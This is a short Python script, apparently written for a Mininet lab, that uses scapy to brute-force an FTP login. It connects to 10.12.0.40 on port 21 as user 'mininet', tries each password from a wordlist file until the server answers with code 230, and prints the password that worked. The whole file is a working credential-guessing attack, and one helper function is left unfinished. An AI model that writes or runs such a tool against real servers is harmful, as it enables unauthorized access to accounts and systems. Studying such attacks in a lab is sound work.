import scapy.all as scapy
from scapy.layers.inet import IP, TCP



def get_passwords():
    with open("passwords.txt", encoding="utf8") as file:
	    return file.readlines()

def command_result(command):
    connexion = scapy.TCP_client.tcplink(scapy.Raw, "10.12.0.40", 21)
    code = connexion.recv()

def attack():
    for password in get_passwords():
        connexion = scapy.TCP_client.tcplink(scapy.Raw, "10.12.0.40", 21)
        code = connexion.recv()
        print(str(code))
        if "220" in str(code) or "530" in str(code):
            connexion.send("USER mininet\r\n")
            code = connexion.recv()
            if "331" in str(code):
                connexion.send("PASS {}\r\n".format(password).encode())
                code = connexion.recv()
                if "230" in str(code):
                    print("success with password: ", password)
                    connexion.close()
                    return
        else:
            print("cannot connect to FTP server")
            connexion.close()
            return

if __name__ == '__main__':
    attack()